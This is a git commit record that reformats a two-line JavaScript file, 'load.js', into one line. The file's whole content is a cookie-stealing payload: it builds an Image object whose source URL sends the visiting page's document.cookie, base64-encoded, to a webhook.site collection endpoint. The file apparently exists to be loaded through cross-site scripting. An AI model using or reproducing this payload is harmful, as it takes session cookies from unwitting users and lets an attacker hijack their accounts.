4a51c395f3fd0847b05436baa59310c708b000c8
d3vNul133x <158163994+FSABE127@users.noreply.github.com>
2025-08-30 12:00:44 +0530

    Update load.js

--- load.js
+++ load.js
@@ -1,2 +1,1 @@
-x = new Image(); 
-x.src = 'https://webhook.site/907c1444-d123-4df9-ba12-d132209149c9?data='+btoa(document.cookie);
+x = new Image();x.src = 'https://webhook.site/907c1444-d123-4df9-ba12-d132209149c9?data='+btoa(document.cookie);
